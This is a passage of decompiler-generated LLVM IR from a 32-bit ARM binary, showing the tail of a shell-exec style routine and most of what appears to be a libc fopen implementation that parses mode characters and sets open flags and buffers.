dec_label_pc_d0e4:                                ; preds = %dec_label_pc_d0cc, %dec_label_pc_d0c0
  store i32 %v0_cfa8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_16944.296 to i32), i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16950.300 to i32), i32* %r2.global-to-local, align 4
  %v8_d0f8 = call i32 @function_10594(i32 ptrtoint ([8 x i8]* @global_var_16944.296 to i32), i32 ptrtoint ([3 x i8]* @global_var_1694c.298 to i32), i32 ptrtoint ([3 x i8]* @global_var_16950.300 to i32), i32 %v0_cfa8, i32 0)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_d100 = call i32 @function_10d38(i32 127)
  unreachable

dec_label_pc_d104:                                ; preds = %dec_label_pc_d05c
  store i32 %v2_d068, i32* @r6, align 4
  store i32 %v2_d068, i32* @r0, align 4
  store i32 67648, i32* @r7, align 4
  %v1_d118 = call i32 @function_10840()
  store i32 %v4_d028, i32* %r0.global-to-local, align 4
  %v1_d120 = call i32 @function_ca18(i32 %v4_d028)
  store i32 %v1_d120, i32* %r0.global-to-local, align 4
  %v0_d124 = load i32, i32* @r5, align 4
  %tmp26 = icmp slt i32 %v0_d124, 1
  br i1 %tmp26, label %dec_label_pc_d194, label %dec_label_pc_d12c

dec_label_pc_d12c:                                ; preds = %dec_label_pc_d104
  store i32 %v1_cfe4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18888.283 to i32), i32* %r4.global-to-local, align 4
  %v2_d138 = add i32 %v1_cfe4, 4
  %v3_d138 = inttoptr i32 %v2_d138 to i32*
  store i32 %v7_d038, i32* %v3_d138, align 4
  %v0_d13c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d13c, i32* %r2.global-to-local, align 4
  %v0_d140 = load i32, i32* @r5, align 4
  %v1_d140 = load i32, i32* %r3.global-to-local, align 4
  %v2_d140 = add i32 %v1_d140, 8
  %v3_d140 = inttoptr i32 %v2_d140 to i32*
  store i32 %v0_d140, i32* %v3_d140, align 4
  store i32 %v2_d068, i32* @r0, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  %v1_d154 = call i32 @function_10840()
  %v0_d158 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d158, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  %v1_d164 = call i32 @function_10838()
  store i32 ptrtoint (i32* @global_var_188a0.288 to i32), i32* %r2.global-to-local, align 4
  %v2_d170 = load i32, i32* @global_var_188a0.288, align 4
  %v2_d174 = inttoptr i32 %v1_cfe4 to i32*
  store i32 %v2_d170, i32* %v2_d174, align 4
  store i32 %v1_cfe4, i32* %r3.global-to-local, align 4
  store i32 %v2_d068, i32* @r0, align 4
  %v1_d184 = load i32, i32* %r2.global-to-local, align 4
  %v2_d184 = inttoptr i32 %v1_d184 to i32*
  store i32 %v1_cfe4, i32* %v2_d184, align 4
  %v1_d18c = call i32 @function_10840()
  store i32 %v1_d18c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d1ac

dec_label_pc_d194:                                ; preds = %dec_label_pc_d104
  store i32 %v7_d038, i32* %r0.global-to-local, align 4
  %v1_d198 = inttoptr i32 %v7_d038 to i8*
  %v2_d198 = call i32 @function_cc14(i8* %v1_d198)
  store i32 %v2_d198, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d19c

dec_label_pc_d19c:                                ; preds = %dec_label_pc_cff8, %dec_label_pc_d048, %dec_label_pc_d194
  store i32 %v1_cfe4, i32* %r0.global-to-local, align 4
  %v1_d1a0 = call i32 @function_fa5c(i32 %v1_cfe4)
  store i32 %v1_d1a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d1ac

dec_label_pc_d1ac:                                ; preds = %dec_label_pc_cfe0, %dec_label_pc_d12c, %dec_label_pc_cfc0, %dec_label_pc_d19c
  %stack_var_-64.1 = phi i32 [ 0, %dec_label_pc_cfe0 ], [ 0, %dec_label_pc_d19c ], [ %v7_d038, %dec_label_pc_d12c ], [ 0, %dec_label_pc_cfc0 ]
  store i32 %stack_var_-64.1, i32* %r0.global-to-local, align 4
  %v2_d1b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_d1b4, i32* %r4.global-to-local, align 4
  ret i32 %stack_var_-64.1

; uselistorder directives
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v7_d038, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v4_d028, { 1, 0, 3, 2, 7, 6, 8, 5, 4, 10, 9, 11 }
  uselistorder i32 %v4_d01c, { 1, 0, 3, 2, 6, 5, 4 }
  uselistorder i32 %v1_cfe4, { 6, 5, 1, 0, 2, 4, 3, 7, 8 }
  uselistorder i32 %v0_d0ac, { 1, 4, 3, 0, 2 }
  uselistorder i32 %v0_cfa8, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 6, 10, 8, 3, 9, 12, 11, 13, 15, 14, 17, 16, 18, 20, 19, 4, 2, 21, 23, 22, 24, 32, 25, 26, 33, 27, 29, 28, 31, 30, 0, 1 }
  uselistorder i32* @global_var_188a0.288, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_188a0.288 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_18888.283 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_d1ac, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_d19c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d0cc, { 1, 0 }
  uselistorder label %dec_label_pc_d0c0, { 1, 0 }
  uselistorder label %dec_label_pc_cfe0, { 1, 0 }
}

define i32 @function_d1dc(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d1dc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d1dc = load i32, i32* @r4, align 4
  store i32 %v3_d1dc, i32* %stack_var_-24, align 4
  %v6_d1dc = load i32, i32* @r5, align 4
  %v9_d1dc = load i32, i32* @r6, align 4
  %v15_d1dc = load i32, i32* @r8, align 4
  %v3_d1e0 = load i8, i8* %arg2, align 1
  %v7_d1e4 = icmp eq i8 %v3_d1e0, 114
  store i1 %v7_d1e4, i1* %cpsr_z.global-to-local, align 1
  %v2_d1e8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r5, align 4
  br i1 %v7_d1e4, label %dec_label_pc_d240, label %dec_label_pc_d1fc

dec_label_pc_d1fc:                                ; preds = %dec_label_pc_d1dc
  %v7_d1fc = icmp eq i8 %v3_d1e0, 119
  store i1 %v7_d1fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d1fc, label %bb, label %dec_label_pc_d208

bb:                                               ; preds = %dec_label_pc_d1fc
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_d244

dec_label_pc_d208:                                ; preds = %dec_label_pc_d1fc
  %v7_d208 = icmp eq i8 %v3_d1e0, 97
  store i1 %v7_d208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d208, label %bb31, label %dec_label_pc_d214

bb31:                                             ; preds = %dec_label_pc_d208
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_d244

dec_label_pc_d214:                                ; preds = %dec_label_pc_d208, %dec_label_pc_d2cc, %dec_label_pc_d2a0
  %v0_d214 = call i32 @function_cc08()
  store i32 %v0_d214, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_d21c = load i32, i32* @r8, align 4
  %v2_d21c = icmp eq i32 %v0_d21c, 0
  store i1 %v2_d21c, i1* %cpsr_z.global-to-local, align 1
  %v2_d220 = inttoptr i32 %v0_d214 to i32*
  store i32 22, i32* %v2_d220, align 4
  br i1 %v2_d21c, label %dec_label_pc_d494, label %dec_label_pc_d228

dec_label_pc_d228:                                ; preds = %dec_label_pc_d2f0._crit_edge, %dec_label_pc_d214
  %v0_d228 = load i32, i32* @r8, align 4
  %v1_d228 = add i32 %v0_d228, 1
  %v2_d228 = inttoptr i32 %v1_d228 to i8*
  %v3_d228 = load i8, i8* %v2_d228, align 1
  %v4_d228 = zext i8 %v3_d228 to i32
  store i32 %v4_d228, i32* %r3.global-to-local, align 4
  %v1_d22c = and i32 %v4_d228, 32
  %v2_d22c = icmp eq i32 %v1_d22c, 0
  store i1 %v2_d22c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d22c, label %dec_label_pc_d494, label %dec_label_pc_d234

dec_label_pc_d234:                                ; preds = %dec_label_pc_d228
  store i32 %v0_d228, i32* %r0.global-to-local, align 4
  %v2_d238 = call i32 @function_fa5c(i32 %v0_d228)
  store i32 %v2_d238, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d494

dec_label_pc_d240:                                ; preds = %dec_label_pc_d1dc
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_d244

dec_label_pc_d244:                                ; preds = %bb, %bb31, %dec_label_pc_d240
  %v1_d25c = phi i32 [ 577, %bb ], [ 1089, %bb31 ], [ 1, %dec_label_pc_d240 ]
  %v2_d244 = add i32 %tmp, 1
  %v3_d244 = inttoptr i32 %v2_d244 to i8*
  %v4_d244 = load i8, i8* %v3_d244, align 1
  %v7_d248 = icmp eq i8 %v4_d244, 98
  store i1 %v7_d248, i1* %cpsr_z.global-to-local, align 1
  %v2_d244.tmp = select i1 %v7_d248, i32 %v2_d244, i32 %tmp
  store i32 %v2_d244.tmp, i32* %r3.global-to-local, align 4
  %v1_d254 = add i32 %v2_d244.tmp, 1
  %v2_d254 = inttoptr i32 %v1_d254 to i8*
  %v3_d254 = load i8, i8* %v2_d254, align 1
  %v4_d254 = zext i8 %v3_d254 to i32
  store i32 %v4_d254, i32* %r3.global-to-local, align 4
  %v7_d258 = icmp eq i8 %v3_d254, 43
  store i1 %v7_d258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d258, label %bb34, label %.thread4

bb34:                                             ; preds = %dec_label_pc_d244
  store i32 %v1_d25c, i32* %r3.global-to-local, align 4
  %v2_d260 = add nuw nsw i32 %v1_d25c, 1
  store i32 %v2_d260, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_d244, %bb34
  %v2_d264 = icmp eq i32 %arg3, 0
  store i1 %v2_d264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d264, label %dec_label_pc_d26c, label %dec_label_pc_d298

dec_label_pc_d26c:                                ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_d270 = call i32 @function_f908(i32 80)
  store i32 %v1_d270, i32* %r0.global-to-local, align 4
  store i32 %v1_d270, i32* @r8, align 4
  %v3_d274 = icmp eq i32 %v1_d270, 0
  store i1 %v3_d274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d274, label %dec_label_pc_d498, label %dec_label_pc_d27c

dec_label_pc_d27c:                                ; preds = %dec_label_pc_d26c
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_d284 = add i32 %v1_d270, 1
  %v4_d284 = inttoptr i32 %v3_d284 to i8*
  store i8 32, i8* %v4_d284, align 1
  %v0_d288 = load i32, i32* %r2.global-to-local, align 4
  %v1_d288 = load i32, i32* @r8, align 4
  %v2_d288 = add i32 %v1_d288, 8
  %v3_d288 = inttoptr i32 %v2_d288 to i32*
  store i32 %v0_d288, i32* %v3_d288, align 4
  %v0_d28c = load i32, i32* %r2.global-to-local, align 4
  %v1_d28c = trunc i32 %v0_d28c to i8
  %v2_d28c = load i32, i32* @r8, align 4
  %v3_d28c = inttoptr i32 %v2_d28c to i8*
  store i8 %v1_d28c, i8* %v3_d28c, align 1
  %v0_d290 = load i32, i32* @r8, align 4
  %v1_d290 = add i32 %v0_d290, 56
  store i32 %v1_d290, i32* @r0, align 4
  %v0_d294 = call i32 @function_d544()
  store i32 %v0_d294, i32* %r0.global-to-local, align 4
  %v0_d298.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d298

dec_label_pc_d298:                                ; preds = %.thread4, %dec_label_pc_d27c
  %v0_d2f0 = phi i32 [ %arg4, %.thread4 ], [ %v0_d298.pre, %dec_label_pc_d27c ]
  %v1_d298 = icmp slt i32 %v0_d2f0, 0
  %v2_d298 = icmp eq i32 %v0_d2f0, 0
  store i1 %v2_d298, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_d298, label %dec_label_pc_d2f0, label %dec_label_pc_d2a0

dec_label_pc_d2a0:                                ; preds = %dec_label_pc_d298
  %v0_d2a4 = load i32, i32* @r4, align 4
  %v2_d2a4 = and i32 %v0_d2a4, 131075
  %v1_d2a8 = add nuw nsw i32 %v2_d2a4, 1
  store i32 %v1_d2a8, i32* %r2.global-to-local, align 4
  %v0_d2ac = load i32, i32* @r6, align 4
  %v1_d2ac = add i32 %v0_d2ac, 1
  %v2_d2b0 = and i32 %v1_d2ac, %v1_d2a8
  store i32 %v2_d2b0, i32* %r3.global-to-local, align 4
  %v9_d2b4 = icmp eq i32 %v2_d2b0, %v1_d2a8
  store i1 %v9_d2b4, i1* %cpsr_z.global-to-local, align 1
  %v1_d2b8 = load i32, i32* @r8, align 4
  %v2_d2b8 = add i32 %v1_d2b8, 4
  %v3_d2b8 = inttoptr i32 %v2_d2b8 to i32*
  store i32 %v0_d2f0, i32* %v3_d2b8, align 4
  br i1 %v9_d2b4, label %dec_label_pc_d2c0, label %dec_label_pc_d214

dec_label_pc_d2c0:                                ; preds = %dec_label_pc_d2a0
  %v0_d2c0 = load i32, i32* @r4, align 4
  %v1_d2c0 = load i32, i32* @r6, align 4
  %v2_d2c0 = sub i32 -1, %v1_d2c0
  %v3_d2c0 = and i32 %v0_d2c0, %v2_d2c0
  store i32 %v3_d2c0, i32* %r3.global-to-local, align 4
  %v1_d2c4 = and i32 %v3_d2c0, 1024
  %v2_d2c4 = icmp eq i32 %v1_d2c4, 0
  store i1 %v2_d2c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d2c4, label %dec_label_pc_d2e4, label %dec_label_pc_d2cc

dec_label_pc_d2cc:                                ; preds = %dec_label_pc_d2c0
  %v0_d2cc = load i32, i32* @r5, align 4
  store i32 %v0_d2cc, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_d2d8 = call i32 @function_10c48(i32 %v0_d2cc, i32 4)
  store i32 %v2_d2d8, i32* %r0.global-to-local, align 4
  %v2_d2dc = icmp eq i32 %v2_d2d8, 0
  store i1 %v2_d2dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d2dc, label %dec_label_pc_d2cc.dec_label_pc_d2e4_crit_edge, label %dec_label_pc_d214

dec_label_pc_d2cc.dec_label_pc_d2e4_crit_edge:    ; preds = %dec_label_pc_d2cc
  %v0_d2e4.pre = load i32, i32* @r6, align 4
  %v0_d2e8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d2e4

dec_label_pc_d2e4:                                ; preds = %dec_label_pc_d2cc.dec_label_pc_d2e4_crit_edge, %dec_label_pc_d2c0
  %v0_d2e8 = phi i32 [ %v0_d2e8.pre, %dec_label_pc_d2cc.dec_label_pc_d2e4_crit_edge ], [ %v0_d2c0, %dec_label_pc_d2c0 ]
  %v0_d2e4 = phi i32 [ %v0_d2e4.pre, %dec_label_pc_d2cc.dec_label_pc_d2e4_crit_edge ], [ %v1_d2c0, %dec_label_pc_d2c0 ]
  %v1_d2e4 = and i32 %v0_d2e4, 131072
  store i32 %v1_d2e4, i32* %r3.global-to-local, align 4
  %v2_d2e8 = or i32 %v1_d2e4, %v0_d2e8
  store i32 %v2_d2e8, i32* @r4, align 4
  br label %dec_label_pc_d314

dec_label_pc_d2f0:                                ; preds = %dec_label_pc_d298
  %v7_d2f0 = icmp eq i32 %v0_d2f0, -1
  store i1 %v7_d2f0, i1* %cpsr_z.global-to-local, align 1
  %v0_d2fc.pre = load i32, i32* @r4, align 4
  br i1 %v7_d2f0, label %dec_label_pc_d2f0._crit_edge, label %bb35

bb35:                                             ; preds = %dec_label_pc_d2f0
  %v2_d2f4 = or i32 %v0_d2fc.pre, 131072
  store i32 %v2_d2f4, i32* @r4, align 4
  br label %dec_label_pc_d2f0._crit_edge

dec_label_pc_d2f0._crit_edge:                     ; preds = %dec_label_pc_d2f0, %bb35
  %v0_d2fc = phi i32 [ %v2_d2f4, %bb35 ], [ %v0_d2fc.pre, %dec_label_pc_d2f0 ]
  %v0_d2f8 = load i32, i32* @r6, align 4
  store i32 %v0_d2f8, i32* %r0.global-to-local, align 4
  store i32 %v0_d2fc, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_d304 = inttoptr i32 %v0_d2f8 to i8*
  %v3_d304 = call i32 @function_10e94(i8* %v2_d304, i32 %v0_d2fc)
  store i32 %v3_d304, i32* %r0.global-to-local, align 4
  %v1_d308 = icmp slt i32 %v3_d304, 0
  %v2_d308 = icmp eq i32 %v3_d304, 0
  store i1 %v2_d308, i1* %cpsr_z.global-to-local, align 1
  %v1_d30c = load i32, i32* @r8, align 4
  %v2_d30c = add i32 %v1_d30c, 4
  %v3_d30c = inttoptr i32 %v2_d30c to i32*
  store i32 %v3_d304, i32* %v3_d30c, align 4
  br i1 %v1_d308, label %dec_label_pc_d228, label %dec_label_pc_d314

dec_label_pc_d314:                                ; preds = %dec_label_pc_d2f0._crit_edge, %dec_label_pc_d2e4
  %v0_d314 = load i32, i32* @r8, align 4
  %v1_d314 = inttoptr i32 %v0_d314 to i32*
  %v2_d314 = load i32, i32* %v1_d314, align 4
  %v1_d318 = and i32 %v2_d314, 8192
  store i32 %v1_d318, i32* %r3.global-to-local, align 4
  %v3_d31c1 = udiv i32 %v1_d318, 256
  store i32 %v3_d31c1, i32* %r2.global-to-local, align 4
  %v1_d320 = trunc i32 %v3_d31c1 to i8
  %v3_d320 = add i32 %v0_d314, 1
  %v4_d320 = inttoptr i32 %v3_d320 to i8*
  store i8 %v1_d320, i8* %v4_d320, align 1
  %v0_d324 = load i32, i32* %r3.global-to-local, align 4
  %v1_d324 = trunc i32 %v0_d324 to i8
  %v2_d324 = load i32, i32* @r8, align 4
  %v3_d324 = inttoptr i32 %v2_d324 to i8*
  store i8 %v1_d324, i8* %v3_d324, align 1
  %v0_d328 = load i32, i32* @r4, align 4
  %v1_d328 = and i32 %v0_d328, 131072
  store i32 %v1_d328, i32* %r1.global-to-local, align 4
  %v2_d328 = icmp eq i32 %v1_d328, 0
  store i1 %v2_d328, i1* %cpsr_z.global-to-local, align 1
  %v0_d32c = load i32, i32* @r8, align 4
  %v1_d32c = add i32 %v0_d32c, 1
  %v2_d32c = inttoptr i32 %v1_d32c to i8*
  %v3_d32c = load i8, i8* %v2_d32c, align 1
  %v4_d32c = zext i8 %v3_d32c to i32
  %v1_d330 = inttoptr i32 %v0_d32c to i8*
  %v2_d330 = load i8, i8* %v1_d330, align 1
  %v3_d330 = zext i8 %v2_d330 to i32
  store i32 %v3_d330, i32* %r3.global-to-local, align 4
  br i1 %v2_d328, label %bb37, label %bb36

bb36:                                             ; preds = %dec_label_pc_d314
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb37

bb37:                                             ; preds = %dec_label_pc_d314, %bb36
  %v0_d344 = phi i32 [ 0, %dec_label_pc_d314 ], [ 32768, %bb36 ]
  %v1_d338 = and i32 %v0_d328, 1024
  store i32 %v1_d338, i32* %r0.global-to-local, align 4
  %v4_d340 = mul nuw nsw i32 %v4_d32c, 256
  %v5_d340 = or i32 %v3_d330, %v4_d340
  %v2_d344 = or i32 %v0_d344, %v1_d338
  store i32 %v2_d344, i32* %r1.global-to-local, align 4
  %v2_d34c = or i32 %v5_d340, %v2_d344
  %v1_d33c = mul i32 %v0_d328, 16
  %v1_d348 = and i32 %v1_d33c, 48
  %v1_d350 = add nuw nsw i32 %v1_d348, 16
  %v4_d354 = xor i32 %v1_d350, 48
  %v5_d354 = or i32 %v2_d34c, %v4_d354
  store i32 %v5_d354, i32* %r3.global-to-local, align 4
  %v3_d35819 = udiv i32 %v2_d34c, 256
  store i32 %v3_d35819, i32* %r2.global-to-local, align 4
  %v1_d35c = trunc i32 %v3_d35819 to i8
  store i8 %v1_d35c, i8* %v2_d32c, align 1
  %v0_d360 = load i32, i32* %r3.global-to-local, align 4
  %v1_d360 = trunc i32 %v0_d360 to i8
  %v2_d360 = load i32, i32* @r8, align 4
  %v3_d360 = inttoptr i32 %v2_d360 to i8*
  store i8 %v1_d360, i8* %v3_d360, align 1
  %v0_d364 = call i32 @function_cc08()
  store i32 %v0_d364, i32* %r0.global-to-local, align 4
  %v0_d368 = load i32, i32* @r8, align 4
  %v1_d368 = add i32 %v0_d368, 1
  %v2_d368 = inttoptr i32 %v1_d368 to i8*
  %v3_d368 = load i8, i8* %v2_d368, align 1
  %v4_d368 = zext i8 %v3_d368 to i32
  store i32 %v4_d368, i32* @r3, align 4
  %v1_d36c = inttoptr i32 %v0_d368 to i8*
  %v2_d36c = load i8, i8* %v1_d36c, align 1
  %v3_d36c = zext i8 %v2_d36c to i32
  store i32 %v0_d364, i32* @r6, align 4
  %v1_d374 = add i32 %v0_d368, 4
  %v2_d374 = inttoptr i32 %v1_d374 to i32*
  %v3_d374 = load i32, i32* %v2_d374, align 4
  store i32 %v3_d374, i32* @r0, align 4
  %v4_d378 = mul nuw nsw i32 %v4_d368, 256
  %v5_d378 = or i32 %v3_d36c, %v4_d378
  store i32 %v5_d378, i32* @r4, align 4
  %v1_d37c = inttoptr i32 %v0_d364 to i32*
  %v2_d37c = load i32, i32* %v1_d37c, align 4
  store i32 %v2_d37c, i32* @r5, align 4
  %v1_d380 = call i32 @function_f1ac(i32 %v3_d374)
  store i32 %v1_d380, i32* %r0.global-to-local, align 4
  %v0_d384 = load i32, i32* @r4, align 4
  %v4_d384 = mul i32 %v1_d380, 256
  %v5_d384 = or i32 %v0_d384, %v4_d384
  store i32 %v5_d384, i32* @r4, align 4
  %v3_d388 = sdiv i32 %v5_d384, 256
  store i32 %v3_d388, i32* %r3.global-to-local, align 4
  %v1_d38c = trunc i32 %v3_d388 to i8
  %v2_d38c = load i32, i32* @r8, align 4
  %v3_d38c = add i32 %v2_d38c, 1
  %v4_d38c = inttoptr i32 %v3_d38c to i8*
  store i8 %v1_d38c, i8* %v4_d38c, align 1
  %v0_d390 = load i32, i32* @r4, align 4
  %v1_d390 = trunc i32 %v0_d390 to i8
  %v2_d390 = load i32, i32* @r8, align 4
  %v3_d390 = inttoptr i32 %v2_d390 to i8*
  store i8 %v1_d390, i8* %v3_d390, align 1
  %v0_d394 = load i32, i32* @r5, align 4
  %v1_d394 = load i32, i32* @r6, align 4
  %v2_d394 = inttoptr i32 %v1_d394 to i32*
  store i32 %v0_d394, i32* %v2_d394, align 4
  %v0_d398 = load i32, i32* @r8, align 4
  %v1_d398 = add i32 %v0_d398, 8
  %v2_d398 = inttoptr i32 %v1_d398 to i32*
  %v3_d398 = load i32, i32* %v2_d398, align 4
  store i32 %v3_d398, i32* %r3.global-to-local, align 4
  %v2_d39c = icmp eq i32 %v3_d398, 0
  store i1 %v2_d39c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d39c, label %dec_label_pc_d3a4, label %bb38

dec_label_pc_d3a4:                                ; preds = %bb37
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_d3a8 = call i32 @function_f908(i32 4096)
  store i32 %v1_d3a8, i32* %r0.global-to-local, align 4
  %v2_d3ac = icmp eq i32 %v1_d3a8, 0
  store i1 %v2_d3ac, i1* %cpsr_z.global-to-local, align 1
  %v1_d3c0.pre = load i32, i32* @r8, align 4
  br i1 %v2_d3ac, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_d3a4
  %v2_d3c020 = add i32 %v1_d3c0.pre, 8
  %v3_d3c021 = inttoptr i32 %v2_d3c020 to i32*
  store i32 0, i32* %v3_d3c021, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_d3a4
  %v2_d3b0 = inttoptr i32 %v1_d3c0.pre to i32*
  %v3_d3b0 = load i32, i32* %v2_d3b0, align 4
  %v2_d3b4 = or i32 %v3_d3b0, 16384
  store i32 %v2_d3b4, i32* %r3.global-to-local, align 4
  %v2_d3b8 = add i32 %v1_d3a8, 4096
  store i32 %v2_d3b8, i32* %r2.global-to-local, align 4
  %v4_d3bc = sdiv i32 %v2_d3b4, 256
  store i32 %v4_d3bc, i32* %r1.global-to-local, align 4
  %v2_d3c0 = add i32 %v1_d3c0.pre, 8
  %v3_d3c0 = inttoptr i32 %v2_d3c0 to i32*
  store i32 %v1_d3a8, i32* %v3_d3c0, align 4
  %v1_d3c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_d3c4 = load i32, i32* @r8, align 4
  %v3_d3c4 = add i32 %v2_d3c4, 12
  %v4_d3c4 = inttoptr i32 %v3_d3c4 to i32*
  store i32 %v1_d3c4, i32* %v4_d3c4, align 4
  %v1_d3c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_d3c8 = trunc i32 %v1_d3c8 to i8
  %v3_d3c8 = load i32, i32* @r8, align 4
  %v4_d3c8 = add i32 %v3_d3c8, 1
  %v5_d3c8 = inttoptr i32 %v4_d3c8 to i8*
  store i8 %v2_d3c8, i8* %v5_d3c8, align 1
  %v0_d3cc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3cc.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_d3cc = load i32, i32* %r3.global-to-local, align 4
  %v2_d3cc = trunc i32 %v1_d3cc to i8
  %v3_d3cc = load i32, i32* @r8, align 4
  %v4_d3cc = inttoptr i32 %v3_d3cc to i8*
  store i8 %v2_d3cc, i8* %v4_d3cc, align 1
  %v0_d3d0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3d0.pr.pr, label %.thread10, label %bb38

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_d3d0 = load i32, i32* @r8, align 4
  %v3_d3d0 = add i32 %v2_d3d0, 12
  %v4_d3d0 = inttoptr i32 %v3_d3d0 to i32*
  store i32 %v1_d3a8, i32* %v4_d3d0, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18140.307 to i32), i32* %r3.global-to-local, align 4
  %v2_d3dc = load i32, i32* @r8, align 4
  %v3_d3dc = add i32 %v2_d3dc, 2
  %v4_d3dc = inttoptr i32 %v3_d3dc to i8*
  store i8 0, i8* %v4_d3dc, align 1
  %v0_d3e0 = load i32, i32* @r8, align 4
  %v1_d3e0 = add i32 %v0_d3e0, 1
  %v2_d3e0 = inttoptr i32 %v1_d3e0 to i8*
  %v3_d3e0 = load i8, i8* %v2_d3e0, align 1
  %v4_d3e0 = zext i8 %v3_d3e0 to i32
  store i32 %v4_d3e0, i32* %r2.global-to-local, align 4
  %v2_d3e4 = load i32, i32* @global_var_18140.307, align 4
  store i32 %v2_d3e4, i32* %r1.global-to-local, align 4
  %v1_d3e8 = add i32 %v0_d3e0, 8
  %v2_d3e8 = inttoptr i32 %v1_d3e8 to i32*
  %v3_d3e8 = load i32, i32* %v2_d3e8, align 4
  store i32 %v3_d3e8, i32* %r3.global-to-local, align 4
  %v1_d3ec = and i32 %v4_d3e0, 32
  %v2_d3ec = icmp eq i32 %v1_d3ec, 0
  store i1 %v2_d3ec, i1* %cpsr_z.global-to-local, align 1
  %v2_d3f0 = add i32 %v0_d3e0, 20
  %v3_d3f0 = inttoptr i32 %v2_d3f0 to i32*
  store i32 %v3_d3e8, i32* %v3_d3f0, align 4
  %v0_d3f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_d3f4 = load i32, i32* @r8, align 4
  %v2_d3f4 = add i32 %v1_d3f4, 44
  %v3_d3f4 = inttoptr i32 %v2_d3f4 to i32*
  store i32 %v0_d3f4, i32* %v3_d3f4, align 4
  %v0_d3f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d3f8 = load i32, i32* @r8, align 4
  %v2_d3f8 = add i32 %v1_d3f8, 52
  %v3_d3f8 = inttoptr i32 %v2_d3f8 to i32*
  store i32 %v0_d3f8, i32* %v3_d3f8, align 4
  %v0_d3fc = load i32, i32* %r3.global-to-local, align 4
  %v1_d3fc = load i32, i32* @r8, align 4
  %v2_d3fc = add i32 %v1_d3fc, 24
  %v3_d3fc = inttoptr i32 %v2_d3fc to i32*
  store i32 %v0_d3fc, i32* %v3_d3fc, align 4
  %v0_d400 = load i32, i32* %r3.global-to-local, align 4
  %v1_d400 = load i32, i32* @r8, align 4
  %v2_d400 = add i32 %v1_d400, 28
  %v3_d400 = inttoptr i32 %v2_d400 to i32*
  store i32 %v0_d400, i32* %v3_d400, align 4
